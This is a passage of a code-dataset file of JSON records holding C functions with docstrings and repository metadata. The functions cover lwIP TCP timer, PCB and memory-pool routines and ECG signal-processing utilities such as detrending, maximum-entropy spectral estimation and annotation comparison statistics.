"language": "c", "size": 17752}
{"docstring": "//extern int printf (char *format, ...) __attribute__ ((__format__ (__printf__, 1, 2)));\n", "func_signal": "void print_pcb (struct tcp_pcb *pcb)", "code": "{\n    int n, l;\n    struct tcp_seg *p;\n    char *state[] =\n\t{ \"BIND\", \"CLOSED\", \"LISTEN\", \"SYN_SENT\", \"SYN_RCVD\", \"ESTABLISHED\", \"FIN_WAIT_1\", \"FIN_WAIT_2\",\n\t\"CLOSE_WAIT\", \"CLOSING\", \"LAST_ACK\", \"TIME_WAIT\"\n    };\n    printf (\"(%.30s) \", pcb->url);\n    printf (\"%s prio=%d %s:%hu-%s:%hu \", state[((unsigned) pcb->state) + 1], (unsigned) pcb->prio,\n\t    (char *) inet_ntoa (pcb->local_ip), pcb->local_port, (char *) inet_ntoa (pcb->remote_ip),\n\t    pcb->remote_port);\n    printf (\"rcv_nxt=%lu rcv_wnd=%hu \", (unsigned long) pcb->rcv_nxt, pcb->rcv_wnd);\n    printf (\"tmr=%lu rtime=%u die=%u mss=%hu \", (unsigned long) pcb->tmr, (unsigned) pcb->rtime,\n\t    (int) pcb->die_timeout, pcb->mss);\n    printf (\"%s%s%s%s%s%s \", (pcb->flags & TF_ACK_DELAY) ? \"ACK_DELAY \" : \"\",\n\t    (pcb->flags & TF_ACK_NOW) ? \"ACK_NOW \" : \"\", (pcb->flags & TF_INFR) ? \"INFR \" : \"\",\n\t    (pcb->flags & TF_RESET) ? \"RESET \" : \"\", (pcb->flags & TF_CLOSED) ? \"CLOSED \" : \"\",\n\t    (pcb->flags & TF_GOT_FIN) ? \"GOT_FIN \" : \"\");\n    printf (\"rttest=%hu rtseq=%lu sa=%ld sv=%ld nrtx=%u \", pcb->rttest, (unsigned long) pcb->rtseq,\n\t    (long) pcb->sa, (long) pcb->sv, (unsigned) pcb->nrtx);\n    printf (\"dupacks=%u rto=%hu lastack=%lu \", (unsigned) pcb->dupacks, pcb->rto,\n\t    (unsigned long) pcb->lastack);\n    printf (\"cwnd=%lu ssthresh=%lu \", (unsigned long) pcb->cwnd, (unsigned long) pcb->ssthresh);\n    printf (\"snd_nxt=%lu snd_max=%lu snd_wnd=%lu snd_wl1=%lu snd_wl2=%lu snd_lbb=%lu \",\n\t    (unsigned long) pcb->snd_nxt, (unsigned long) pcb->snd_max, (unsigned long) pcb->snd_wnd,\n\t    (unsigned long) pcb->snd_wl1, (unsigned long) pcb->snd_wl2, (unsigned long) pcb->snd_lbb);\n    printf (\"snd_queuelen=%u \", (unsigned) pcb->snd_queuelen);\n    printf (\"snd_buf=%hu \", (unsigned) pcb->snd_buf);\n    printf (\"acked=%hu \", (unsigned) pcb->acked);\n    printf (\"polltmr=%u pollinterval=%u \", (unsigned) pcb->polltmr, (unsigned) pcb->pollinterval);\n    for (n = l = 0, p = pcb->unsent; p; p = p->next)\n\tn++, l += p->p->tot_len;\n    printf (\"unsent=%u,%ub \", n, l);\n    for (n = l = 0, p = pcb->unacked; p; p = p->next)\n\tn++, l += p->p->tot_len;\n    printf (\"unacked=%u,%ub \", n, l);\n    printf (\"\\n\");\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * tcp_recved():\n *\n * This function should be called by the application when it has\n * processed the data. The purpose is to advertise a larger window\n * when the data has been processed.\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\ntcp_recved(struct tcp_pcb *pcb, u16_t len)", "code": "{\n  magic (pcb, TCPPCB_MAGIC);\n\n  pcb->rcv_wnd += len;\n  if(pcb->rcv_wnd > TCP_WND_MAX) {\n    pcb->rcv_wnd = TCP_WND_MAX;\n  }\n  if(!(pcb->flags & TF_ACK_DELAY) &&\n     !(pcb->flags & TF_ACK_NOW)) {\n    tcp_ack(pcb);\n  }\n  DEBUGF(TCP_DEBUG, (\"tcp_recved: recveived %d bytes, wnd %u (%u).\\n\",\n\t\t     len, pcb->rcv_wnd, TCP_WND - pcb->rcv_wnd));\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * tcp_pcb_remove():\n *\n * Purges the PCB and removes it from a PCB list. Any delayed ACKs are sent first.\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\ntcp_pcb_remove(struct tcp_pcb **pcblist, struct tcp_pcb *pcb)", "code": "{\n  TCP_RMV(pcblist, pcb);\n\n  magic (pcb, TCPPCB_MAGIC);\n\n  tcp_pcb_purge(pcb);\n  \n  /* if there is an outstanding delayed ACKs, send it */\n  if(pcb->state != TIME_WAIT &&\n#ifdef BIND_CHECK\n     pcb->state != BIND &&\n#endif\n     pcb->state != LISTEN &&\n     pcb->flags & TF_ACK_DELAY) {\n    pcb->flags |= TF_ACK_NOW;\n    tcp_output(pcb);\n  }  \n  pcb->state = CLOSED;\n\n  ASSERT(\"tcp_pcb_remove: tcp_pcbs_sane()\", tcp_pcbs_sane());\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "int\ntcp_pcbs_sane(void)", "code": "{\n  struct tcp_pcb *pcb;\n  for(pcb = tcp_active_pcbs; pcb != NULL; pcb = pcb->next) {\n    ASSERT(\"tcp_pcbs_sane: active pcb->state != CLOSED\", pcb->state != CLOSED);\n    ASSERT(\"tcp_pcbs_sane: active pcb->state != LISTEN\", pcb->state != LISTEN);\n#ifdef BIND_CHECK\n    ASSERT(\"tcp_pcbs_sane: active pcb->state != BIND\", pcb->state != BIND);\n#endif\n    ASSERT(\"tcp_pcbs_sane: active pcb->state != TIME-WAIT\", pcb->state != TIME_WAIT);\n  }\n  for(pcb = tcp_tw_pcbs; pcb != NULL; pcb = pcb->next) {\n    ASSERT(\"tcp_pcbs_sane: tw pcb->state == TIME-WAIT\", pcb->state == TIME_WAIT);\n  }\n  return 1;\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\ntcp_debug_print_flags(u8_t flags)", "code": "{\n  if(flags & TCP_FIN) {\n    DEBUGF(TCP_DEBUG, (\"FIN \"));\n  }\n  if(flags & TCP_SYN) {\n    DEBUGF(TCP_DEBUG, (\"SYN \"));\n  }\n  if(flags & TCP_RST) {\n    DEBUGF(TCP_DEBUG, (\"RST \"));\n  }\n  if(flags & TCP_PSH) {\n    DEBUGF(TCP_DEBUG, (\"PSH \"));\n  }\n  if(flags & TCP_ACK) {\n    DEBUGF(TCP_DEBUG, (\"ACK \"));\n  }\n  if(flags & TCP_URG) {\n    DEBUGF(TCP_DEBUG, (\"URG \"));\n  }\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * tcp_segs_free():\n *\n * Deallocates a list of TCP segments (tcp_seg structures).\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "u8_t\ntcp_segs_free(struct tcp_seg *seg)", "code": "{\n  u8_t count = 0;\n  struct tcp_seg *next;\n again:  \n  if(seg != NULL) {\n    next = seg->next;\n    count += tcp_seg_free(seg);\n    seg = next;\n    goto again;\n  }\n  return count;\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * tcp_abort()\n *\n * Aborts a connection by sending a RST to the remote host and deletes\n * the local protocol control block. This is done when a connection is\n * killed because of shortage of memory.\n *\n * This function free's the pcb struct. Do NOT use the pcb struct after\n * calling this function.\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "int\ntcp_abortable(struct tcp_pcb *pcb)", "code": "{\n  struct tcp_pcb *cpcb;\n  for(cpcb = (struct tcp_pcb *)tcp_active_pcbs;\n      cpcb != NULL; cpcb = cpcb->next)\n    if (cpcb == pcb)\n      return 1;\n  for(cpcb = (struct tcp_pcb *)tcp_tw_pcbs;\n      cpcb != NULL; cpcb = cpcb->next)\n    if (cpcb == pcb)\n      return 1;\n  return 0;\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\nicmp_time_exceeded(struct pbuf *p, enum icmp_te_type t)", "code": "{\n  struct pbuf *q;\n  struct ip_hdr *iphdr;\n  struct icmp_te_hdr *tehdr;\n\n  DEBUGF(ICMP_DEBUG, (\"icmp_time_exceeded\\n\"));\n  \n  q = pbuf_alloc(PBUF_TRANSPORT, 8 + IP_HLEN + 8, PBUF_RAM);\n\n  iphdr = p->payload;\n  \n  tehdr = q->payload;\n  tehdr->type = (char)ICMP6_TE;\n  tehdr->icode = (char)t;\n\n  /* copy fields from original packet */\n  bcopy((char *)p->payload, (char *)q->payload + 8, IP_HLEN + 8);\n  \n  /* calculate checksum */\n  tehdr->chksum = 0;\n  tehdr->chksum = inet_chksum(tehdr, q->len);\n#ifdef ICMP_STATS\n  ++stats.icmp.xmit;\n#endif /* ICMP_STATS */\n  ip_output(q, NULL, \n\t    (struct ip_addr *)&(iphdr->src), ICMP_TTL, IP_PROTO_ICMP);\n  pbuf_free(q);\n}", "path": "ports\\lwip\\src\\core\\ipv6\\icmp6.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void \nmemp_freep(memp_t type, void *mem)", "code": "{\n  sys_sem_wait(mutex);\n  memp_free(type, mem);\n  sys_sem_signal(mutex);\n}", "path": "ports\\lwip\\src\\core\\memp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/* 0 */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\nmemp_free(memp_t type, void *mem)", "code": "{\n  struct memp *memp;\n\n  if(mem == NULL) {\n    return;\n  }\n  memp = (struct memp *)((u8_t *)mem - sizeof(struct memp));\n\n#ifdef MEMP_STATS\n  stats.memp[type].used--; \n#endif /* MEMP_STATS */\n  \n  memp->next = memp_tab[type]; \n  memp_tab[type] = memp;\n\n  ASSERT(\"memp sanity\", memp_sanity());\n  return;\n}", "path": "ports\\lwip\\src\\core\\memp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static void\ntcp_kill_timewait(void)", "code": "{\n  struct tcp_pcb *pcb, *inactive;\n  u32_t inactivity;\n\n  inactivity = 0;\n  inactive = NULL;\n  for(pcb = tcp_tw_pcbs; pcb != NULL; pcb = pcb->next) {\n    if((u32_t)(tcp_ticks - pcb->tmr) >= inactivity) {\n      inactivity = tcp_ticks - pcb->tmr;\n      inactive = pcb;\n    }\n  }\n  if(inactive != NULL) {\n    DEBUGF(TCP_DEBUG, (\"tcp_mem_reclaim: killing oldest TIME-WAIT PCB 0x%p (%ld)\\n\",\n\t\t       inactive, inactivity));\n    tcp_abort(inactive);\n  }      \n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * tcp_slowtmr():\n *\n * Called every 500 ms and implements the retransmission timer and the timer that\n * removes PCBs that have been in TIME-WAIT for enough time. It also increments\n * various timers such as the inactivity timer in each PCB.\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\ntcp_slowtmr(void)", "code": "{\n  struct tcp_pcb *pcb, *pcb2, *prev;\n  u32_t eff_wnd;\n  u8_t pcb_remove;      /* flag if a PCB should be removed */\n  err_t err = ERR_OK;\n\n  ++tcp_ticks;\n  \n  /* Steps through all of the active PCBs. */\n  prev = NULL;\n  pcb = tcp_active_pcbs;\n  while(pcb != NULL) {\n    ASSERT(\"tcp_timer_coarse: active pcb->state != CLOSED\", pcb->state != CLOSED);\n    ASSERT(\"tcp_timer_coarse: active pcb->state != LISTEN\", pcb->state != LISTEN);\n#ifdef BIND_CHECK\n    ASSERT(\"tcp_timer_coarse: active pcb->state != BIND\", pcb->state != BIND);\n#endif\n    ASSERT(\"tcp_timer_coarse: active pcb->state != TIME-WAIT\", pcb->state != TIME_WAIT);\n\n    pcb_remove = 0;\n\n    if(pcb->state == SYN_SENT && pcb->nrtx == TCP_SYNMAXRTX) {\n      ++pcb_remove;\n    } else if(pcb->state != SYN_SENT && pcb->nrtx == TCP_MAXRTX) { /* psheer: Added pcb->state != SYN_SENT because\n\t\t\t\t\t\t\t   I like connect to try much harder than anything else */\n      ++pcb_remove;\n    } else {\n      ++pcb->rtime;\n      if(pcb->unacked != NULL && pcb->rtime >= pcb->rto) {\n        \n\t/* Time for a retransmission. */\n        DEBUGF(TCP_RTO_DEBUG, (\"tcp_timer_coarse: rtime %ld pcb->rto %d\\n\",\n                               tcp_ticks - pcb->rtime, pcb->rto));\n\n\t/* Double retransmission time-out unless we are trying to\n         * connect to somebody (i.e., we are in SYN_SENT). */\n\tif(pcb->state != SYN_SENT) {\n\t  pcb->rto = ((pcb->sa >> 3) + pcb->sv) << tcp_backoff[pcb->nrtx];\n\t}\n\ttcp_rexmit(pcb);\n        /* Reduce congestion window and ssthresh. */\n        eff_wnd = MIN(pcb->cwnd, pcb->snd_wnd);\n        pcb->ssthresh = eff_wnd >> 1;\n        if(pcb->ssthresh < pcb->mss) {\n          pcb->ssthresh = pcb->mss * 2;\n        }\n        pcb->cwnd = pcb->mss;\n\n        DEBUGF(TCP_CWND_DEBUG, (\"tcp_rexmit_seg: cwnd %u ssthresh %u\\n\",\n                                (unsigned int) pcb->cwnd, (unsigned int) pcb->ssthresh));\n      }\n    }\n\t  \n    /* Check if this PCB has stayed too long in FIN-WAIT-2 */\n    if(pcb->state >= FIN_WAIT_1) {  /* psheer: was \"if(pcb->state == FIN_WAIT_2)\" --> I don't like my TCP\n                                       sessions to hang around for ever. I don't care what the RFC says. */\n      if((u32_t)(tcp_ticks - pcb->tmr) >\n\t TCP_FIN_WAIT_TIMEOUT / TCP_SLOW_INTERVAL) {\n //print_trace_back();\n        ++pcb_remove;\n      }\n    }\n\n#ifdef __PAULOS__\n    if(pcb->die_timeout) {\n      if((u32_t)(tcp_ticks - pcb->tmr) >\n\t (u32_t)pcb->die_timeout * 1000 / TCP_SLOW_INTERVAL) {\n //print_trace_back();\n        ++pcb_remove;\n      }\n    }\n#endif\n\n    /* If this PCB has queued out of sequence data, but has been\n       inactive for too long, will drop the data (it will eventually\n       be retransmitted). */\n#if TCP_QUEUE_OOSEQ    \n    if(pcb->ooseq != NULL &&\n       (u32_t)tcp_ticks - pcb->tmr >=\n       pcb->rto * TCP_OOSEQ_TIMEOUT) {\n      tcp_segs_free(pcb->ooseq);\n      pcb->ooseq = NULL;\n    }\n#endif /* TCP_QUEUE_OOSEQ */\n\n    /* Check if this PCB has stayed too long in SYN-RCVD */\n    if(pcb->state == SYN_RCVD) {\n      if((u32_t)(tcp_ticks - pcb->tmr) >\n\t TCP_SYN_RCVD_TIMEOUT / TCP_SLOW_INTERVAL) {\n        ++pcb_remove;\n      }\n    }\n\n\n    /* If the PCB should be removed, do it. */\n    if(pcb_remove) {\n      tcp_pcb_purge(pcb);      \n      /* Remove PCB from tcp_active_pcbs list. */\n      if(prev != NULL) {\n\tASSERT(\"tcp_timer_coarse: middle tcp != tcp_active_pcbs\", pcb != tcp_active_pcbs);\n        prev->next = pcb->next;\n      } else {\n        /* This PCB was the first. */\n        ASSERT(\"tcp_timer_coarse: first pcb == tcp_active_pcbs\", tcp_active_pcbs == pcb);\n        tcp_active_pcbs = pcb->next;\n      }\n\n      TCP_EVENT_ERR(pcb->errf, pcb->callback_arg, ERR_ABRT);\n      /*      if(pcb->errf != NULL) {\n\tpcb->errf(pcb->callback_arg, ERR_ABRT);\n\t}*/\n\n      pcb2 = pcb->next;\n#ifdef HAVE_MAGIC\n      pcb->magic = 0;\n      get_stack_trace (pcb->backtrace, 32);\n#endif\n      memp_free(MEMP_TCP_PCB, pcb);\n      pcb = pcb2;\n    } else {\n\n      /* We check if we should poll the connection. */\n      ++pcb->polltmr;\n      if(pcb->polltmr >= pcb->pollinterval) {\n\tpcb->polltmr = 0;\n\tTCP_EVENT_POLL(pcb, err);\n\t/*\tpcb->poll(pcb->callback_arg, pcb);*/\n\tif(err == ERR_OK) {\n\ttcp_output(pcb);\n      }\n      }\n      \n      prev = pcb;\n      pcb = pcb->next;\n    }\n  }\n\n  \n  /* Steps through all of the TIME-WAIT PCBs. */\n  prev = NULL;    \n  pcb = tcp_tw_pcbs;\n  while(pcb != NULL) {\n    ASSERT(\"tcp_timer_coarse: TIME-WAIT pcb->state == TIME-WAIT\", pcb->state == TIME_WAIT);\n    pcb_remove = 0;\n\n    /* Check if this PCB has stayed long enough in TIME-WAIT */\n#ifdef __PAULOS__\n/* we limit this to 10 seconds (NOT 2 full minutes as in\n   default lwIP) to reduce number of current connections */\n    if((u32_t)(tcp_ticks - pcb->tmr) > 10000 / TCP_SLOW_INTERVAL) {\n      ++pcb_remove;\n    }\n#else\n    if((u32_t)(tcp_ticks - pcb->tmr) > 2 * TCP_MSL / TCP_SLOW_INTERVAL) {\n      ++pcb_remove;\n    }\n#endif\n    \n\n\n    /* If the PCB should be removed, do it. */\n    if(pcb_remove) {\n      tcp_pcb_purge(pcb);      \n      /* Remove PCB from tcp_tw_pcbs list. */\n      if(prev != NULL) {\n\tASSERT(\"tcp_timer_coarse: middle tcp != tcp_tw_pcbs\", pcb != tcp_tw_pcbs);\n        prev->next = pcb->next;\n      } else {\n        /* This PCB was the first. */\n        ASSERT(\"tcp_timer_coarse: first pcb == tcp_tw_pcbs\", tcp_tw_pcbs == pcb);\n        tcp_tw_pcbs = pcb->next;\n      }\n      pcb2 = pcb->next;\n#ifdef HAVE_MAGIC\n      pcb->magic = 0;\n      get_stack_trace (pcb->backtrace, 32);\n#endif\n      memp_free(MEMP_TCP_PCB, pcb);\n      pcb = pcb2;\n    } else {\n      prev = pcb;\n      pcb = pcb->next;\n    }\n  }\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/* This function detrends (subtracts a least-squares fitted line from)\n   a sequence of n uniformly spaced ordinates supplied in c. */\n", "func_signal": "int detrend(double *c, long n)", "code": "{\n    int i = 0;\n    double a = 0.0, b = 0.0, tsqsum = 0.0, ysum = 0.0, t = 0.0;\n\n    for (i = 0; i < n; i++)\n\tysum += c[i];\n    for (i = 0; i < n; i++) {\n\tt = i - n/2 + 0.5;\n\ttsqsum += t*t;\n\tb += t*c[i];\n    }\n    b /= tsqsum;\n    a = ysum/n - b*(n-1)/2.0;\n    for (i = 0; i < n; i++)\n\tc[i] -= a + b*i;\n    if (b < -0.04 || b > 0.04)\n\tfprintf(stderr,\n\t\t\"%s: (warning) possibly significant trend in input series\\n\",\n\t\tpname);\n    return 0;\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\memse.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* Read input data, allocating and filling x[] and y[].  The return value is\n   the number of points read.\n\n   This function allows the input buffers to grow as large as necessary, up to\n   the available memory (assuming that a long int is large enough to address\n   any memory location). */\n", "func_signal": "unsigned long input()", "code": "{\n    unsigned long npts = 0L;\n\n    if ((x = (float *)malloc(nmax * sizeof(float))) == NULL ||\n\t(y = (float *)malloc(nmax * sizeof(float))) == NULL ||\n\t(wk1 = (float *)malloc(64 * nmax * sizeof(float))) == NULL ||\n\t(wk2 = (float *)malloc(64 * nmax * sizeof(float))) == NULL) {\n\tif (x) (void)free(x);\n\tfclose(ifile);\n\terror(\"insufficient memory\");\n    }\n\n    while (fscanf(ifile, \"%f%f\", &x[npts], &y[npts]) == 2) {\n        if (++npts >= nmax) {\t/* double the size of the input buffers */\n\t    float *xt, *yt, *w1t, *w2t;\n\t    unsigned long nmaxt = nmax << 1;\n\n\t    if (64 * nmaxt * sizeof(float) < nmax) {\n\t\tfprintf(stderr,\n\t\t      \"%s: insufficient memory, truncating input at row %d\\n\",\n\t\t      pname, npts);\n\t        break;\n\t    }\n\t    if ((xt = (float *)realloc(x, nmaxt * sizeof(float))) == NULL) {\n\t\tfprintf(stderr,\n\t\t      \"%s: insufficient memory, truncating input at row %d\\n\",\n\t\t      pname, npts);\n\t        break;\n\t    }\n\t    x = xt;\n\t    if ((yt = (float *)realloc(y, nmaxt * sizeof(float))) == NULL) {\n\t\tfprintf(stderr,\n\t\t      \"%s: insufficient memory, truncating input at row %d\\n\",\n\t\t      pname, npts);\n\t        break;\n\t    }\n\t    y = yt;\n\t    if ((w1t = (float *)realloc(wk1,64*nmaxt*sizeof(float))) == NULL){\n\t\tfprintf(stderr,\n\t\t      \"%s: insufficient memory, truncating input at row %d\\n\",\n\t\t      pname, npts);\n\t        break;\n\t    }\n\t    wk1 = w1t;\n\t    if ((w2t = (float *)realloc(wk2,64*nmaxt*sizeof(float))) == NULL){\n\t\tfprintf(stderr,\n\t\t      \"%s: insufficient memory, truncating input at row %d\\n\",\n\t\t      pname, npts);\n\t        break;\n\t    }\n\t    wk2 = w2t;\n\t    nmax = nmaxt;\n\t}\n    }\n\n    fclose(ifile);\n    if (npts < 1) error(\"no data read\");\n    return (npts);\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\lomb.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* Evaluate power spectral estimate at f (0 <= f < = 0.5, where 1 is the\n   sampling frequency), given MEM coefficients in cof[0 ... m-1] and pm\n   (see Numerical Recipes, pp. 451-452). */\n", "func_signal": "double evlmem(double f, double *cof, long m, double pm)", "code": "{\n    int i = 0;\n    double sumr = 1.0, sumi = 0.0;\n    double wr = 1.0, wi = 0.0, wpr = 0.0, wpi = 0.0, wt = 0.0, theta = 0.0;\n\n    theta = 2.0*PI*f;\n    wpr = cos(theta);\n    wpi = sin(theta);\n    for (i = 0; i < m; i++) {\n\twt = wr;\n\tsumr -= cof[i]*(wr = wr*wpr - wi*wpi);\n\tsumi -= cof[i]*(wi = wi*wpr + wt*wpi);\n    }\n    return (pm/(sumr*sumr+sumi*sumi));\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\memse.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* See Harris, F.J., \"On the use of windows for harmonic analysis with the\n   discrete Fourier transform\", Proc. IEEE, Jan. 1978 */\n", "func_signal": "double win_blackman_harris(int j, long n)", "code": "{\n    double a = 2.0*PI/(n-1), w = 0.0;\n\n    w = 0.35875 - 0.48829*cos(a*j) + 0.14128*cos(2*a*j) - 0.01168*cos(3*a*j);\n    wsum += w;\n    return (w);\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\memse.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* Function 'integ' was contributed by Peter P. Domitrovich, who translated it\n   from a FORTRAN version by an unknown author from a book written in Chinese.\n   This code is designed to integrate functions with sharp peaks. */\n", "func_signal": "double integ(double *aa, long m, double ee, double a, double b, double epsilon)", "code": "{\n  double f[3][31], fm[3][31], e[3][31], krtn[31];\n  double sum = 0.0, t = 1.0, absa = 1.0, est = 1.0, f1 = 0.0, fa = 0.0,\n      fb = 0.0, fp = 0.0, x = a, da = b - a, dx = 0.0, sx = 0.0, fm1 = 0.0,\n      e1 = 0.0, s = 0.0;\n  long l = 0, k = 0;\n\n  fa = evlmem(a, aa, m, ee);\n  fb = evlmem(b, aa, m, ee);\n  fp = 4.0 * evlmem(0.5 * (a + b), aa, m, ee);\n  while (1) {\n      k = 1;\n      l++;\n      t *= 1.7;\n      dx = da / 3.0;\n      sx = dx / 6.0;\n      fm1 = 4.0 * evlmem(x + 0.5 * dx, aa, m, ee);\n      f1 = evlmem(x + dx, aa, m, ee);\n      fm[1][l] = fp;\n      f[1][l] = evlmem(x + 2.0 * dx, aa, m, ee);\n      fm[2][l] = 4.0 * evlmem (x + 2.5 * dx, aa, m, ee);\n      f[2][l] = fb;\n      e1 = sx * (fa + fm1 + f1);\n      e[1][l] = sx * (f1 + fp + f[1][l]);\n      e[2][l] = sx * (f[1][l] + fm[2][l] + fb);\n      s = e1 + e[1][l] + e[2][l];\n      absa = absa - fabs(est) + fabs(e1) + fabs(e[1][l]) + fabs(e[2][l]);\n      if (fabs (est - 1.0) < 1.0e-06) {\n\t  est = e1;\n\t  fp = fm1;\n\t  fb = f1;\n\t  da = dx;\n\t  krtn[l] = k;\n\t  continue;\n      }\n      if (t * fabs (est - s) <= epsilon * absa) {\n\t  sum += s;\n\t  do {\n\t      l--;\n\t      t /= 1.7;\n\t      k = krtn[l];\n\t      dx *= 3.0;\n\t      if (k == 3 && l - 1 <= 0)\n\t\t  return sum;\n\t  } while (k == 3 && l - 1 > 0);\n\t  est = e[k][l];\n\t  fp = fm[k][l];\n\t  fa = fb;\n\t  fb = f[k][l];\n\t  k++;\n\t  x += da;\n\t  da = dx;\n\t  krtn[l] = k;\n\t  continue;\n\t}\n      if (l < 30) {\n\t  est = e1;\n\t  fp = fm1;\n\t  fb = f1;\n\t  da = dx;\n\t  krtn[l] = k;\n\t  continue;\n      }\n      sum += 5.0;\n      do {\n\t  l--;\n\t  t /= 1.7;\n\t  k = krtn[l];\n\t  dx *= 3.0;\n\t  if (k == 3 && l - 1 <= 0)\n\t      return sum;\n      } while (k == 3 && l - 1 > 0);\n      est = e[k][l];\n      fp = fm[k][l];\n      fa = fb;\n      fb = f[k][l];\n      k++;\n      x += da;\n      da = dx;\n      krtn[l] = k;\n  }\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\memse.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* Undo any mode changes. */\n", "func_signal": "void mode_undo()", "code": "{\n    xv_set(ts_item, PANEL_VALUE, tsa_index, NULL);\n    xv_set(vs_item, PANEL_VALUE, vsa_index, NULL);\n    xv_set(sig_item, PANEL_VALUE, sig_mode, NULL);\n    xv_set(ann_item, PANEL_VALUE, ann_mode, NULL);\n    xv_set(ov_item, PANEL_VALUE, overlap, NULL);\n    xv_set(tim_item, PANEL_VALUE, time_mode, NULL);\n    xv_set(grid_item, PANEL_VALUE, grid_mode, NULL);\n    xv_set(opt_item, PANEL_VALUE,\n\t    (show_subtype & 1) |\n\t   ((show_chan    & 1) << 1) |\n\t   ((show_num     & 1) << 2) |\n\t   ((show_aux     & 1) << 3) |\n\t   ((show_marker  & 1) << 4) |\n\t   ((show_signame & 1) << 5) |\n\t   ((show_baseline& 1) << 6) |\n\t   ((show_level   & 1) << 7),\n\t   NULL);\n}", "path": "ecg\\third\\wfdb-10.5.4\\wave\\modepan.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* Make the display mode popup window appear. */\n", "func_signal": "void show_mode()", "code": "{\n    if (mode_popup_active < 0) create_mode_popup();\n    xv_set(mode_frame, WIN_SHOW, TRUE, 0);\n    mode_popup_active = 1;\n}", "path": "ecg\\third\\wfdb-10.5.4\\wave\\modepan.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* `pstat' prints a statistic described by s, defined as the quotient of a and\n   b expressed in percentage units.  Undefined values are indicated by `-'. */\n", "func_signal": "void pstat(char *s, char *f, long a, long b)", "code": "{\n    if (fflag == 1 || fflag == 3 || fflag == 4 || fflag == 6) {\n\t(void)fprintf(ofile, \"%s: \", s);\n\tif (b <= 0) (void)fprintf(ofile, \"     - \");\n\telse {\n\t    (void)fprintf(ofile, f, (100.*a)/b);\n\t    (void)fprintf(ofile, \"%%\");\n\t}\n\t(void)fprintf(ofile, \" (%ld/%ld)\\n\", a, b);\n    }\n    else if (b <= 0) (void)fprintf(ofile, \"      -\");\n    else { (void)fprintf(ofile, \" \"); (void)fprintf(ofile, f, (100.*a)/b); }\n}", "path": "ecg\\third\\eplimited_cpp_old\\bxbep.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* Functions rpann() and tpann() return the appropriate pseudo-beat label\n   for the time specified by their argument.  They should be called only\n   with time arguments which match the times of the current test or reference\n   beat labels, since they depend on getref() and gettest() to locate the two\n   most recent VF and shutdown periods and have no information about earlier\n   or later VF or shutdown periods. */\n", "func_signal": "int rpann(long t)", "code": "{\n    if ((vfonref!=-1L && vfonref<=t && (t<=vfoffref || vfoffref==-1L)) ||\n\t(pvfonref!=-1L && pvfonref<=t && t<=pvfoffref))\n\treturn ('*');\t/* test beat labels during reference-marked VF are\n\t\t\t   not to be counted;  since `*' is not recognized by\n\t\t\t   pair(), returning `*' accomplishes this */\n    else if ((sdonref!=-1L && sdonref<=t && (t<=sdoffref || sdoffref== -1L)) ||\n\t(psdonref!=-1L && psdonref<=t && t<=psdoffref))\n\treturn ('X');\t/* test beat labels during reference-marked 